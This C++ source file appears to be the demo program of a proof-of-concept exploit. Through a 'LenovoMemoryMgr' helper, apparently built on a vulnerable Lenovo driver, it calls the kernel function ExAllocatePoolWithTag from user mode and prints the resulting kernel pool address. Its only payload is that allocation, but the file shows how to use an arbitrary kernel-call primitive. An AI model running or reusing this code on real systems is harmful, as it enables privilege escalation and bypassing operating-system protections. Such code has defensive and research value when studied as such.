#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <conio.h>
#include "LenovoMemoryMgr.h"

int main() 
{
	LenovoMemoryMgr lm = LenovoMemoryMgr();
	
	BOOL hasInit = lm.Init();
	
	if (!hasInit) 
	{
		return -1;
	}

	const auto ex_allocate_pool = lm.GetKernelExport("ExAllocatePoolWithTag");
	const auto pool = lm.CallKernelFunction(ex_allocate_pool, 0x0, 0x1000, 0x1337, 0);

	std::cout << std::hex << pool << std::endl;
	
	lm.Shutdown();
	
	return 0;
}
